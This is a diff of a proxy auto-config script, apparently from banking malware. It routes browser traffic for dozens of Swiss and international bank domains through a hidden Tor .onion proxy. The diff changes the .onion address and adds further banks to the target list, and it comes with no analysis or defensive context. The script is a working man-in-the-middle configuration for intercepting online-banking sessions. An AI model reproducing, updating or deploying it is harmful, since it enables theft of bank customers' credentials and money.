@@ -1,5 +1,5 @@
 function FindProxyForURL(url, host) {
-    var proxy = "PROXY paoyu7gub72lykuk.onion:5588;";
+    var proxy = "PROXY m665veffg3tqxoza.onion:5588;";
     var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', '*akb.ch',
         '*ubs.com', 'tb.raiffeisendirect.ch', '*bkb.ch', '*lukb.ch',
         '*zkb.ch', '*onba.ch', '*gkb.ch', '*bekb.ch', '*zugerkb.ch',
@@ -26,7 +26,9 @@ function FindProxyForURL(url, host) {
         '*bil.com', '*vontobel.com', '*pbgate.net', '*bnpparibas.com',
         '*ceanet.ch', '*ce-riviera.ch', '*cedc.ch', '*cmvsa.ch',
         '*ekaffoltern.ch', '*glarner-regionalbank.ch', '*cen.ch',
-        '*cbhbank.com', '*coutts.com', '*cimbanque.net', '*cembra.ch');
+        '*cbhbank.com', '*coutts.com', '*cimbanque.net', '*cembra.ch',
+        '*commerzbank.com', '*dominickco.ch', '*efginternational.com',
+        '*exane.com', '*falconpb.com');
     for (var i = 0; i < hosts.length; i++) {
         if (shExpMatch(host, hosts[i])) {
             return proxy
